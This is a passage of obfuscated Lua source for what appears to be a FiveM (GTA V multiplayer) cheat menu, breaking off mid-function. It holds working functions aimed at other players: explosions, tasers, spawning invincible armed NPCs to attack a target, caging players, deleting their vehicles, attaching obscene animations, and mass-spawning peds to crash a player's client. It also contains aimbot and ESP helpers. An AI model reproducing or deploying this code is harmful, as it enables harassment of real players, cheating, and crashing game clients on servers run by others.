    cursor_x = cursor_x / widht
    cursor_y = cursor_y / height
    
    local widht = GetTextWidht(text, 0, 0.2)

    if( (cursor_x) + 0.03 >= x+to_add_X and (cursor_x) - 0.1 <= x+to_add_X and (cursor_y) + 0.009 >= y+to_add_Y and (cursor_y) - 0.009 <= y+to_add_Y) then
        SetTextColour(menucolor.r,menucolor.g,menucolor.b, 255)
        vitolasRPMQCUeMEUCUyy(text, x+to_add_X-0.028, y+to_add_Y-0.011, outline, 0.3, 4, admgordolas)
    else
        vitolasRPMQCUeMEUCUyy(text, x+to_add_X-0.218, y+to_add_Y-0.011, outline, 0.3, 4, admgordolas)
    end


    if( (cursor_x) + 0.03 >= x+to_add_X and (cursor_x) - 0.1 <= x+to_add_X and (cursor_y) + 0.009 >= y+to_add_Y and (cursor_y) - 0.009 <= y+to_add_Y and IsDisabledControlJustReleased(0, 92)) then 
        return vitolasRPMQCUeMEUCUzz
    else
        return admgordolas
    end
end


function meucuuuuuuu(x, y, a9, aa, r, g, b, ab)
    resX, resY = GetActiveScreenResolution()
    local aC, aB = a9 / resX, aa / resY
    local _x, _y = x / resX + aC / 2, y / resY + aB / 2
    vitolasRPMQCUeMEUCUuu(_x, _y, aC, aB, r, g, b, ab)
end
local function ShootAt(target, bone)
    local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, bone), 0.0, 0.0, 0.0)
    SetPedShootsAtCoord(PlayerPedId(), boneTarget, vitolasRPMQCUeMEUCUzz)
end
local function ShootAt2(target, bone, damage)
    local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, bone), 0.0, 0.0, 0.0)
    local _, weapon = GetCurrentPedWeapon(PlayerPedId())
    ShootSingleBulletBetweenCoords(
        AddVectors(boneTarget, vector3(0, 0, 0.1)),
        boneTarget,
        damage,
        vitolasRPMQCUeMEUCUzz,
        weapon,
        PlayerPedId(),
        vitolasRPMQCUeMEUCUzz,
        vitolasRPMQCUeMEUCUzz,
        1000.0
    )
end

function DrawLineBox(entity, r, g, b, a)
    if entity then
        local model = GetEntityModel(entity)
        local min, max = GetModelDimensions(model)
        local top_front_right = GetOffsetFromEntityInWorldCoords(entity, max)
        local top_back_right = GetOffsetFromEntityInWorldCoords(entity, vector3(max.x, min.y, max.z))
        local bottom_front_right = GetOffsetFromEntityInWorldCoords(entity, vector3(max.x, max.y, min.z))
        local bottom_back_right = GetOffsetFromEntityInWorldCoords(entity, vector3(max.x, min.y, min.z))
        local top_front_left = GetOffsetFromEntityInWorldCoords(entity, vector3(min.x, max.y, max.z))
        local top_back_left = GetOffsetFromEntityInWorldCoords(entity, vector3(min.x, min.y, max.z))
        local bottom_front_left = GetOffsetFromEntityInWorldCoords(entity, vector3(min.x, max.y, min.z))
        local bottom_back_left = GetOffsetFromEntityInWorldCoords(entity, min)
    

        DrawLine(top_front_right, top_back_right, r, g, b, a)
        DrawLine(top_front_right, bottom_front_right, r, g, b, a)
        DrawLine(bottom_front_right, bottom_back_right, r, g, b, a)
        DrawLine(top_back_right, bottom_back_right, r, g, b, a)

        DrawLine(top_front_left, top_back_left, r, g, b, a)
        DrawLine(top_back_left, bottom_back_left, r, g, b, a)
        DrawLine(top_front_left, bottom_front_left, r, g, b, a)
        DrawLine(bottom_front_left, bottom_back_left, r, g, b, a)

        DrawLine(top_front_right, top_front_left, r, g, b, a)
        DrawLine(top_back_right, top_back_left, r, g, b, a)
        DrawLine(bottom_front_left, bottom_front_right, r, g, b, a)
        DrawLine(bottom_back_left, bottom_back_right, r, g, b, a)
    end
end

local function RGBRainbow(frequency)
    local result = {}
    local curtime = GetGameTimer() / 1000

    result.r = admmeupau.floor(admmeupau.sin(curtime * frequency + 0) * 127 + 128)
    result.g = admmeupau.floor(admmeupau.sin(curtime * frequency + 2) * 127 + 128)
    result.b = admmeupau.floor(admmeupau.sin(curtime * frequency + 4) * 127 + 128)

    return result
end



function VeioTaradoVitolasMelhorMonster()

    local rmodel = "a_m_o_acult_01"
    local ped = GetPlayerPed(player)
    local coords = GetOffsetFromEntityInWorldCoords(GetPlayerPed(player), 0.0, 8.0, 0.5)
    local x = coords.x
    local y = coords.y
    local z = coords.z

    RequestModel(vitolasRPMQCUeMEUCUff(rmodel))
    RequestAnimDict("rcmpaparazzo_2")

    while not HasModelLoaded(vitolasRPMQCUeMEUCUff(rmodel)) and not killmenu do
        vitolasRPMQCUeMEUCUtt(0)
    end

    while not HasAnimDictLoaded("rcmpaparazzo_2") and not killmenu do
        vitolasRPMQCUeMEUCUtt(0)
    end

    local nped = CreatePed(31, rmodel, x, y, z, 0.0, vitolasRPMQCUeMEUCUzz, vitolasRPMQCUeMEUCUzz)
    SetPedComponentVariation(nped, 4, 0, 0, 0)

    SetPedKeepTask(nped)
    TaskPlayAnim(nped, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1,49, 0, 16, 0, 0)

    AttachEntityToEntity(nped, ped, 0, 0.0, -0.3, 0.0, 0.0, 0.0, 0.0, vitolasRPMQCUeMEUCUzz, vitolasRPMQCUeMEUCUzz, vitolasRPMQCUeMEUCUzz, vitolasRPMQCUeMEUCUzz, 0, vitolasRPMQCUeMEUCUzz)

end

function BugarVeiculoRP()
local ped = GetPlayerPed(SelectedPlayer)
            local prop = CreateObject(vitolasRPMQCUeMEUCUff("\112\114\111\112\95\114\117\98\95\119\104\101\101\108\95\48\50"), 9, 9, 9, 1, 1, 1)
            AttachEntityToEntity(
                prop,
                ped,
                0,
                0.0,
                0.0,
                0.0,
                0,
                0.0,
                0.0,
                admgordolas,
                admgordolas,
                vitolasRPMQCUeMEUCUzz,
                admgordolas,
                0,
                vitolasRPMQCUeMEUCUzz
            )
end

function deletarVeiculoPlayer()
    DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer)))
end

function TPPlayer()
    local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
    SetEntityCoordsNoOffset(PlayerPedId(), coords, 0.0, 0.0, 0.0) 
end

function ExplodirPlayerRP()
    if not HasModelLoaded(vitolasRPMQCUeMEUCUff('a_m_m_acult_01')) then
        RequestModel(vitolasRPMQCUeMEUCUff('a_m_m_acult_01'))
        local ped = CreatePed(5, vitolasRPMQCUeMEUCUff('a_m_m_acult_01'), GetOffsetFromEntityInWorldCoords(GetPlayerPed(SelectedPlayer), 0.0, -1.0, -1.0), GetEntityHeading(GetPlayerPed(SelectedPlayer)), vitolasRPMQCUeMEUCUzz, vitolasRPMQCUeMEUCUzz)
            
            
        Citizen.CreateThread(function()
            vitolasRPMQCUeMEUCUtt(100)
            AddExplosion(GetEntityCoords(ped), 29, 500.0, vitolasRPMQCUeMEUCUzz, admgordolas, admgordolas, admgordolas)
        end)
    end
end

function TazerPlayerRP()
    local ped = GetPlayerPed(player)
            local tLoc = GetEntityCoords(ped)
            local destination = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
            local origin = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
            ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_STUNGUN`, PlayerPedId(), true, false, 1.0)
end

function CaixaoPlayerKK()
    local ped = GetPlayerPed(SelectedPlayer)
        local prop = CreateObject(vitolasRPMQCUeMEUCUff("prop_coffin_01"), 9, 9, 9, 1, 1, 1)
        AttachEntityToEntity(
            prop,
            ped,
            0,
            0.0,
            0.0,
            0.0,
            0,
            0.0,
            0.0,
            admgordolas,
            admgordolas,
            vitolasRPMQCUeMEUCUzz,
            admgordolas,
            0,
            vitolasRPMQCUeMEUCUzz
        )
end

function bicosabmxx() 
    
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
    GetRamedByVehiclee('bmx')
end

function NPC_FACA()
    local pedname = "a_f_m_eastsa_02"
        local wep = "WEAPON_KNIFE"
        for i = 0,0 do
          local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
          RequestModel(GetHashKey(pedname))
          Citizen.Wait(50)
          if HasModelLoaded(GetHashKey(pedname)) then
            local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0)
            NetworkRegisterEntityAsNetworked(ped)
            if DoesEntityExist(ped) and
            not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
              local netped = PedToNet(ped)
              NetworkSetNetworkIdDynamic(netped)
              SetNetworkIdCanMigrate(netped)
              SetNetworkIdExistsOnAllMachines(netped)
              Citizen.Wait(500)
              NetToPed(netped)
              GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
              SetEntityInvincible(ped)
              SetPedCanSwitchWeapon(ped)
              TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
              TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
            else
              Citizen.Wait(0)
            end
        end
    end
end

function NPC_RIFLE()
    local pedname = "a_m_m_golfer_01"
        local wep = "WEAPON_CARBINERIFLE"
        for i = 0,0 do
          local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
          RequestModel(GetHashKey(pedname))
          Citizen.Wait(50)
          if HasModelLoaded(GetHashKey(pedname)) then
            local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0)
            NetworkRegisterEntityAsNetworked(ped)
            if DoesEntityExist(ped) and
            not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
              local netped = PedToNet(ped)
              NetworkSetNetworkIdDynamic(netped)
              SetNetworkIdCanMigrate(netped)
              SetNetworkIdExistsOnAllMachines(netped)
              Citizen.Wait(500)
              NetToPed(netped)
              GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
              SetEntityInvincible(ped)
              SetPedCanSwitchWeapon(ped)
              TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
              TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
            else
              Citizen.Wait(0)
            end
        end
    end
end

function NPC_RIFLE_EXPLODE()
    local pedname = "u_m_y_juggernaut_01"
        local wep = "weapon_railgun"
        for i = 0,0 do
          local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
          RequestModel(GetHashKey(pedname))
          Citizen.Wait(50)
          if HasModelLoaded(GetHashKey(pedname)) then
            local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0)
            NetworkRegisterEntityAsNetworked(ped)
            if DoesEntityExist(ped) and
            not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
              local netped = PedToNet(ped)
              NetworkSetNetworkIdDynamic(netped)
              SetNetworkIdCanMigrate(netped)
              SetNetworkIdExistsOnAllMachines(netped)
              Citizen.Wait(500)
              NetToPed(netped)
              GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
              SetEntityInvincible(ped)
              SetPedCanSwitchWeapon(ped)
              TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
              TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
            else
              Citizen.Wait(0)
            end
        end
    end
end

function NPC_RIFLE_LASER()
    local pedname = "u_m_y_juggernaut_01"
        local wep = "weapon_rayminigun"
        for i = 0,0 do
          local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
          RequestModel(GetHashKey(pedname))
          Citizen.Wait(50)
          if HasModelLoaded(GetHashKey(pedname)) then
            local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0)
            NetworkRegisterEntityAsNetworked(ped)
            if DoesEntityExist(ped) and
            not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
              local netped = PedToNet(ped)
              NetworkSetNetworkIdDynamic(netped)
              SetNetworkIdCanMigrate(netped)
              SetNetworkIdExistsOnAllMachines(netped)
              Citizen.Wait(500)
              NetToPed(netped)
              GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
              SetEntityInvincible(ped)
              SetPedCanSwitchWeapon(ped)
              TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
              TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
            else
              Citizen.Wait(0)
            end
        end
    end
end

function PeixeNoBumbumKKK()
    local rmodel = "a_c_fish"
    local ped = GetPlayerPed(SelectedPlayer)
    local coords = GetOffsetFromEntityInWorldCoords(GetPlayerPed(SelectedPlayer), 0.0, 8.0, 0.5)
    local x = coords.x
    local y = coords.y
    local z = coords.z
    RequestModel(GetHashKey(rmodel))
    local nped = CreatePed(31, rmodel, x, y, z, 0.0, true, true)
    SetPedComponentVariation(nped, 4, 0, 0, 0)
    SetPedKeepTask(nped)
    AttachEntityToEntity(nped, ped, 0, 0.0, -0.3, 0.0, 0.0, 0.0, 0.0, true, true, true, true, 0, true)
end

function CrashPlayerVitolas()
    local coord = GetEntityCoords(GetPlayerPed(SelectedPlayer))
    local CrashingPeds = {
        "a_m_m_acult_01",
        "a_m_m_hasjew_01",
        "a_m_m_hillbilly_01",
        "a_m_m_tranvest_01",
        "a_m_y_acult_02",
        "mp_m_fibsec_01",
        "mp_m_bogdangoon",
        "mp_m_meth_01",
    }
    local crashpeds = (CrashingPeds[math.random(#CrashingPeds)])
    if not HasModelLoaded(GetHashKey(crashpeds)) then 
        RequestModel(GetHashKey(crashpeds))
    end 
    for i = 1, 20 do 
        CreatePed(3, GetHashKey(crashpeds), coord, 1, 1, 1)
    end
end

function GetRamedByVehiclee(veh, playa)
    Citizen.CreateThread(function()
        if veh then
            RequestModel((veh))
            while not HasModelLoaded((veh)) do
                Wait(0)
            end	
            
            local coords = GetEntityCoords(GetPlayerPed(playa))
            local veh = CreateVehicle((veh), coords.x, coords.y, coords.z , 1, 1, 1)
            local rotation = GetEntityRotation(playa)
            
            SetVehicleEngineOn(veh)
            SetEntityRotation(veh, rotation, 0.0, 0.0, 0.0)
        end
    end)
end

function CARRO_SEGUINDO()
    Citizen.CreateThread(function()
        local target = GetPlayerPed(SelectedPlayer)
        local assped = Pryorbypessed
        local vehlist = {'Nero', 'Deluxo', 'Raiden', 'Bati2', "SultanRS", "TA21", "Lynx", "ZR380", "Streiter", "Neon", "Italigto", "Nero2", "Fmj", "le7b", "prototipo", "cyclone", "khanjali", "STROMBERG", "BARRAGE", "COMET5"}
        local veh = vehlist[math.random(#vehlist)]
        local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
        local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
        local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
        local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
        local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
        local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
        print("~")
        if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer)) then
            local vt = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
            NetworkRequestControlOfEntity(vt)
            SetVehicleModKit(vt, 0)
            ToggleVehicleMod(vt, 20, 1)
            SetVehicleModKit(vt, 0)
            SetVehicleTyresCanBurst(vt, 1)
        end
        local v = Pryorbypessed
        RequestModel(veh)
        RequestModel('s_m_y_hwaycop_01')
        while not HasModelLoaded(veh) and not HasModelLoaded('s_m_m_security_01') do
            print("~")
            RequestModel('s_m_y_hwaycop_01')
            Citizen.Wait(0)
            RequestModel(veh)
        end
        if HasModelLoaded(veh) then
            print("~")
            Citizen.Wait(50)
            v =
                CreateVehicle(
                veh,
                pos.x - (xf * 10),
                pos.y - (yf * 10),
                pos.z + 1,
                GetEntityHeading(GetPlayerPed(-1)),
                1,
                1
            )
            v1 =
                CreateVehicle(
                veh,
                pos.x - (xf * 10),
                pos.y - (yf * 10),
                pos.z + 1,
                GetEntityHeading(GetPlayerPed(-1)),
                1,
                1
            )
            SetVehicleGravityAmount(v, 15.0)
            SetVehicleGravityAmount(v1, 15.0)
            SetEntityInvincible(v)
            SetEntityInvincible(v1)
            if DoesEntityExist(v) then
                print("~")
                NetworkRequestControlOfEntity(v)
                SetVehicleDoorsLocked(v, 4)
                RequestModel('s_m_y_hwaycop_01')
                Citizen.Wait(50)
                if HasModelLoaded('s_m_y_hwaycop_01') then
                    print("~")
                    Citizen.Wait(50)
                    local pas = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z)
                    local pas1 = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z)
                    local ped = CreatePed(21, GetHashKey('s_m_y_hwaycop_01'), pos.x, pos.y, pos.z)
                    local ped1 = CreatePed(21, GetHashKey('s_m_y_hwaycop_01'), pos.x, pos.y, pos.z)
                    assped = ped
                    if DoesEntityExist(ped1) and DoesEntityExist(ped) then
                        print("~")
                        GiveWeaponToPed(pas, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                        GiveWeaponToPed(pas1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                        GiveWeaponToPed(ped, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                        GiveWeaponToPed(ped1, GetHashKey('WEAPON_APPISTOL'), 9999, 1, 1)
                        print("~")
                        SetPedIntoVehicle(ped, v, -1)
                        SetPedIntoVehicle(ped1, v1, -1)
                        SetPedIntoVehicle(pas, v, 0)
                        SetPedIntoVehicle(pas1, v1, 0)
                        print("~")
                        TaskVehicleEscort(ped1, v1, target, -1, 50.0, 1082917029, 7.5, 0, -1)
                        asstarget = target
                        TaskVehicleEscort(ped, v, target, -1, 50.0, 1082917029, 7.5, 0, -1)
                        SetDriverAbility(ped, 10.0)
                        SetDriverAggressiveness(ped, 10.0)
                        SetDriverAbility(ped1, 10.0)
                        SetDriverAggressiveness(ped1, 10.0)
                    end
                end
            end
        end
    end)
end

function NPC_TAZER()
    local pedname = "a_f_m_beach_01"
        local wep = "weapon_stungun"
        for i = 0,0 do
          local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
          RequestModel(GetHashKey(pedname))
          Citizen.Wait(50)
          if HasModelLoaded(GetHashKey(pedname)) then
            local ped = CreatePed(21, GetHashKey(pedname),coords.x + i, coords.y - i, coords.z, 0) and CreatePed(21, GetHashKey(pedname),coords.x - i, coords.y + i, coords.z, 0)
            NetworkRegisterEntityAsNetworked(ped)
            if DoesEntityExist(ped) and
            not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
              local netped = PedToNet(ped)
              NetworkSetNetworkIdDynamic(netped)
              SetNetworkIdCanMigrate(netped)
              SetNetworkIdExistsOnAllMachines(netped)
              Citizen.Wait(500)
              NetToPed(netped)
              GiveWeaponToPed(ped,GetHashKey(wep), 9999, 1, 1)
              SetEntityInvincible(ped)
              SetPedCanSwitchWeapon(ped)
              TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0,16)
            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
              TaskCombatHatedTargetsInArea(ped, coords.x,coords.y, coords.z, 500)
            else
              Citizen.Wait(0)
           end
        end
    end
end 

function ExplosaoInvisivel()
    local ped = GetPlayerPed(SelectedPlayer)
    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, 0)
end

function CurarPlayerRP()
    local medkitname = "PICKUP_HEALTH_STANDARD"
    local medkit = GetHashKey(medkitname)
    local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
    CreateAmbientPickup(medkit, coords.x, coords.y, coords.z + 1.0, 1, 1, medkit, 1, 0)
    SetPickupRegenerationTime(pickup, 60)
end

function AllArmasPlayer()
    for i = 1, #allWeapons do
        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250)
    end
end

function MolotovPlayerVitolasRP()
    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 3, 2000.0, 0)
    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 3, 2000.0)
end

local function text4(name,outline,size,Justification,xx,yy, font)

    if outline then

        SetTextOutline()

    end

    if font ~= vitolasRPMQCUeMEUCUss and tonumber(font) ~= vitolasRPMQCUeMEUCUss then

    SetTextFont(font)

    else

    SetTextFont(6)

    end

    SetTextProportional(1)

    SetTextScale(100.0, size)

    SetTextEdge(1, 0, 0,227,255)

    BeginTextCommandDisplayText("STRING")

    AddTextComponentSubstringWebsite(name)

    EndTextCommandDisplayText(xx, yy)

end










local function boxzinha(name,xx,yy,yy2,bool)

    local MmanacokkkSpriteScale_DSGJHSDIGSDG = { x = 0.017, y = 0.12 }

    local x,y = GetNuiCursorPosition()

    local x_res, y_res = GetActiveScreenResolution()

    local xx2 = xx-0.006

    if bool then


    --DrawSprites("mpleaderboard", "leaderboard_voteblank_icon", xx2, yy2, MmanacokkkSpriteScale_DSGJHSDIGSDG.x, MmanacokkkSpriteScale_DSGJHSDIGSDG.y, 0.0, 52, 50, 54, 255)
    vitolasRPMQCUeMEUCUuu(xx2,yy2,0.0036,0.0078,0, 0, 255, 255)

    else
        vitolasRPMQCUeMEUCUuu(xx2,yy2,0.0036,0.008,30,30,30,255)
        vitolasRPMQCUeMEUCUuu(xx2,yy2,0.0036,0.008,30,30,30,255)

    --DrawSprites("mpleaderboard", "leaderboard_voteblank_icon", xx2, yy2, MmanacokkkSpriteScale_DSGJHSDIGSDG.x, MmanacokkkSpriteScale_DSGJHSDIGSDG.y-0., 0.0, 52, 50,54, 255)

    end

    --[[if bool then vitolasRPMQCUeMEUCUuu(xx2, yy2, 0.0075, 0.013, 52, 50, 54, 255)vitolasRPMQCUeMEUCUuu(xx2, yy2, 0.006, 0.012, 39, 38, 39, 255)DrawSprites("commonmenu", "shop_tick_icon", xx2, yy2, MmanacokkkSpriteScale_DSGJHSDIGSDG.x, MmanacokkkSpriteScale_DSGJHSDIGSDG.y, 0.0, 129, 142, 25, 255)else vitolasRPMQCUeMEUCUuu(xx2, yy2, 0.0075, 0.013, 52, 50, 54, 255)vitolasRPMQCUeMEUCUuu(xx2, yy2, 0.006, 0.012, 39, 38, 39, 255)end]]

    text4(name,admgordolas,0.29,0,xx,yy - 0.010, 6)

    if( (x / x_res) + 0.030 >= xx and (x / x_res) - 0.029 <= xx and (y / y_res) + 0.009 >= yy and (y / y_res) - 0.01 <= yy) and IsDisabledControlJustReleased(0, 92) then 

        bool = not bool

        
    

        return vitolasRPMQCUeMEUCUzz

end

    return admgordolas


end 




function CagePlayer(player)
    local ped = GetPlayerPed(player)
    local coords = GetEntityCoords(ped)
    local inveh = IsPedInAnyVehicle(ped)

    if inveh then
        
        obj = CreateObject(vitolasRPMQCUeMEUCUff("prop_const_fence03b_cr"), coords.x -6.8, coords.y + 1, coords.z - 1.5, 0, 1, 1)
        SetEntityHeading(obj, 90.0)
        
        CreateObject(vitolasRPMQCUeMEUCUff("prop_const_fence03b_cr"), coords.x - 0.6, coords.y + 6.8, coords.z - 1.5, 0, 1, 1)
        
        CreateObject(vitolasRPMQCUeMEUCUff("prop_const_fence03b_cr"), coords.x - 0.6, coords.y - 4.8, coords.z - 1.5, 0, 1, 1)

        obj2 = CreateObject(vitolasRPMQCUeMEUCUff("prop_const_fence03b_cr"), coords.x + 4.8, coords.y + 1, coords.z - 1.5, 0, 1, 1)
        SetEntityHeading(obj2, 90.0)
        
        obj = CreateObject(vitolasRPMQCUeMEUCUff("prop_const_fence03b_cr"), coords.x -6.8, coords.y + 1, coords.z + 1.3, 0, 1, 1)
        SetEntityHeading(obj, 90.0)
        
        CreateObject(vitolasRPMQCUeMEUCUff("prop_const_fence03b_cr"), coords.x - 0.6, coords.y + 6.8, coords.z + 1.3, 0, 1, 1)
        
        CreateObject(vitolasRPMQCUeMEUCUff("prop_const_fence03b_cr"), coords.x - 0.6, coords.y - 4.8, coords.z + 1.3, 0, 1, 1)

        obj2 = CreateObject(vitolasRPMQCUeMEUCUff("prop_const_fence03b_cr"), coords.x + 4.8, coords.y + 1, coords.z + 1.3, 0, 1, 1)
        SetEntityHeading(obj2, 90.0)
    else

    local obj = CreateObject(vitolasRPMQCUeMEUCUff("prop_fnclink_03gate5"), coords.x - 0.6, coords.y - 1, coords.z - 1, 1, 1, 1)
    FreezeEntityPosition(obj, vitolasRPMQCUeMEUCUzz)
    local obj2 = CreateObject(vitolasRPMQCUeMEUCUff("prop_fnclink_03gate5"), coords.x - 0.55, coords.y - 1.05, coords.z - 1, 1, 1, 1)
    SetEntityHeading(obj2, 90.0)
    FreezeEntityPosition(obj2, vitolasRPMQCUeMEUCUzz)
    local obj3 = CreateObject(vitolasRPMQCUeMEUCUff("prop_fnclink_03gate5"), coords.x - 0.6, coords.y + 0.6, coords.z - 1, 1, 1, 1)
    FreezeEntityPosition(obj3, vitolasRPMQCUeMEUCUzz)
    local obj4 = CreateObject(vitolasRPMQCUeMEUCUff("prop_fnclink_03gate5"), coords.x + 1.05, coords.y - 1.05, coords.z - 1, 1, 1, 1)
    SetEntityHeading(obj4, 90.0)
    FreezeEntityPosition(obj4, vitolasRPMQCUeMEUCUzz)
    local obj5 = CreateObject(vitolasRPMQCUeMEUCUff("prop_fnclink_03gate5"), coords.x - 0.6, coords.y - 1, coords.z + 1.5, 1, 1, 1)
    FreezeEntityPosition(obj5, vitolasRPMQCUeMEUCUzz)
    local obj6 = CreateObject(vitolasRPMQCUeMEUCUff("prop_fnclink_03gate5"), coords.x - 0.55, coords.y - 1.05, coords.z + 1.5, 1, 1, 1)
    SetEntityHeading(obj6, 90.0)
    FreezeEntityPosition(obj6, vitolasRPMQCUeMEUCUzz)
